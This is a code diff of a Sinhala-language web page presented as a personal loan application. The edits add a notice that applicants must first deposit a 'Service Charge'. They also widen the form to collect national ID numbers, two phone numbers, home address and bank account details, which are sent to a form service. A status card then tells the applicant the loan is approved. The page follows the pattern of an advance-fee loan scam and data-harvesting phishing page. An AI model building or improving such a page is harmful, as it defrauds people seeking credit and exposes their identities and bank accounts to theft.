@@ -3,33 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ණය අයදුම්පත</title>
+    <title>පුද්ගලික ණය පහසුකම් - අයදුම්පත</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; text-align: center; }
-        .card { background: white; padding: 20px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); }
-        input, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        .card { background: white; padding: 20px; border-radius: 10px; max-width: 450px; margin: auto; box-shadow: 0px 0px 10px rgba(0,0,0,0.1); text-align: left; }
+        input, textarea, button { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
         button { background: #28a745; color: white; font-size: 16px; border: none; cursor: pointer; }
         .hidden { display: none; }
         .success-box { background: #d4edda; color: #155724; padding: 15px; border-radius: 5px; margin-top: 15px; }
+        .info-box { background: #e2f0d9; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-size: 14px; }
     </style>
 </head>
 <body>
 
     <div class="card" id="formCard">
-        <h2>ණය අයදුම්පත</h2>
+        <h2 style="text-align: center; color: #333;">💰 පුද්ගලික ණය අයදුම්පත</h2>
+        <div class="info-box">
+            <p><b>⚠️ සැලකිය යුතුයි:</b> ණය මුදල ලබා ගැනීමට පෙර අදාළ Service Charge මුදල ඩිපොසිට් කළ යුතුය.</p>
+        </div>
+        
         <form id="loanForm" action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="saveLoanData(event)">
-            <input type="text" name="nic" id="nic" placeholder="ජාතික හැඳුනුම්පත් අංකය (NIC)" required>
-            <input type="text" name="phone" id="phone" placeholder="දුරකථන අංකය" required>
-            <input type="text" name="address" id="address" placeholder="ලිපිනය" required>
-            <input type="number" name="amount" id="amount" placeholder="අවශ්‍ය ණය මුදල" required>
-            <input type="text" name="bank" id="bank" placeholder="බැංකු විස්තර" required>
-            <button type="submit">අයදුම් කරන්න</button>
+            <label>ජාතික හැඳුනුම්පත් අංකය (NIC):</label>
+            <input type="text" name="nic" id="nic" required>
+
+            <label>ප්‍රධාන දුරකථන අංකය:</label>
+            <input type="text" name="phone1" id="phone1" required>
+
+            <label>දෙවන දුරකථන අංකය:</label>
+            <input type="text" name="phone2" id="phone2" required>
+
+            <label>ස්ථීර ලිපිනය:</label>
+            <textarea name="address" id="address" rows="2" required></textarea>
+
+            <label>අවශ්‍ය ණය මුදල (රු.):</label>
+            <input type="number" name="amount" id="amount" placeholder="උදා: 100000" required>
+
+            <label>බැංකු විස්තර (ගිණුම් අංකය, බැංකුව, ශාඛාව):</label>
+            <textarea name="bank" id="bank" rows="2" placeholder="Service charge එක දැමීමට සහ ණය මුදල ලබා ගැනීමට අවශ්‍ය බැංකු විස්තර" required></textarea>
+
+            <button type="submit">අයදුම්පත යොමු කරන්න</button>
         </form>
     </div>
 
-    <div class="card hidden" id="statusCard">
+    <!-- Status Card -->
+    <div class="card hidden" id="statusCard" style="text-align: center;">
         <h2 id="statusTitle">⏳ අයදුම්පත ලැබුණි</h2>
-        <p id="statusText">ඔබගේ ණය අයදුම්පත පරීක්ෂා කරමින් පවතී. කරුණාකර රැඳී සිටින්න...</p>
+        <p id="statusText">ඔබගේ අයදුම්පත පරීක්ෂා කරමින් පවතී. පැය 2ක් ඇතුළත සකස් කෙරේ.</p>
         
         <div class="hidden success-box" id="approvedDetails">
             <h3>✅ ණය අනුමත විය!</h3>
@@ -41,10 +60,10 @@
 
     <script>
         function saveLoanData(e) {
-            // මෙතනදී කස්ටමර් දාපු හැම විස්තරයක්ම සේව් කරගන්නවා
             const loanData = {
                 nic: document.getElementById('nic').value,
-                phone: document.getElementById('phone').value,
+                phone1: document.getElementById('phone1').value,
+                phone2: document.getElementById('phone2').value,
                 address: document.getElementById('address').value,
                 amount: document.getElementById('amount').value,
                 bank: document.getElementById('bank').value,
@@ -63,7 +82,7 @@
                     document.getElementById('statusTitle').innerText = "සාර්ථකයි!";
                     document.getElementById('statusText').innerText = "ඔබගේ ණය අයදුම්පත අනුමත කර ඇත.";
                     document.getElementById('approvedDetails').classList.remove('hidden');
-                    document.getElementById('accNumber').innerText = "8123456789";
+                    document.getElementById('accNumber').innerText = "ගිණුම් විස්තර යවා ඇත";
                     document.getElementById('bankName').innerText = data.bank;
                     document.getElementById('approvedAmount').innerText = data.amount;
                 }
